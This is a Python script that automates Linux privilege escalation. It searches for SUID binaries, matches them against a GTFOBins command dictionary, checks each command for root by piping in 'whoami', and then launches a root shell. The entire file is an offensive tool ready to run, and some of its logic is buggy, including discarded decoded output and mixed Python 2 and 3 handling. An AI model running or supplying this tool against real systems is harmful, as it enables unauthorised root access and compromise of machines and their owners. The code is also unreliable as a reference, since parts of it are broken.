#!/usr/bin/env python
try: 
	import subprocess as sub
	import os
	compatmode = 0  # newer version of python, no need for compatibility mode
except ImportError:
	import os  # older version of python, need to use os instead
	compatmode = 1

from gtfObins import gtfobinsDict


def execute_cmd(cmddict):

    for item in cmddict:
        cmd = cmddict[item]["cmd"]
        if compatmode == 0:  # newer version of python, use preferred subprocess
            out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
            results = out.split('\n')
        else:  # older version of python, use os.popen
            echo_stdout = os.popen(cmd, 'r')
            results = echo_stdout.read().split('\n')

        # write the results to the command Dictionary for each command run
        cmddict[item]["results"] = results

    return cmddict


def findSUID () : 
    cmd  = { "SUID": {"cmd": "find /usr/bin -perm -u=s -type f 2>/dev/null", "msg": "Searching for binaries with SUID", "results": []} 
    }
    res = execute_cmd (cmd)
    suidList = res['SUID']['results']
    return suidList



def formatList (suidList) :

    suidListDecoded = []
    binaries_pathsList = []
    binariesList = []
    

    # Decoding our lists of binarires found on the system 
    for i in suidList : 
        j = i.decode()
        suidListDecoded.append(j)
    
    # Format of the retrived binary  : /path/to/binary
    # Split to : path/to & binary 
    suidListDecoded=suidList
    for  binary in suidListDecoded : 
        binary = os.path.split(binary)
        binaries_pathsList.append(binary)
    
    # Get only the list of binaries 
    for binaryTuple in binaries_pathsList : 
        path, binary = binaryTuple
        binariesList.append(binary)
    return binariesList



def matchbinaries(binariesList) : 
    #Search for common binaries between binaries list and gtfobins
    match_list = []
    gtfobinslist = list(gtfobinsDict.keys())
    for element in binariesList:
        if element in gtfobinsDict:
            match_list.append(element)
  
    return match_list


def checkIFRoot (binary) : 
    child = sub.Popen(binary,shell =True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE) 
    stdout, stderr =child.communicate(b'whoami')
    if stdout == b'root\n' : 
        return True 
    
   


def privescalation (binariesList):
    binaries  = matchbinaries(binariesList)
    if not binaries:
        return "No binaries with SUID found on system"
    else : 
        print(" ############## Binaries with enabled SUID are : ##############\n"+' '.join(binariesList))   

        for binary in binaries : 
            print ("trying privilege escalation with "+binary)
            try : 
                if checkIFRoot(gtfobinsDict[binary]) : 
                    return sub.Popen(gtfobinsDict[binary],shell =True).wait() 
                else : 
                    print ("failed with binary "+binary) 
            except : 
                return "Something went wrong while executing command : "+ gtfobinsDict[binary]

           
            

listes =  findSUID() 
x=formatList(listes)
privescalation (x)

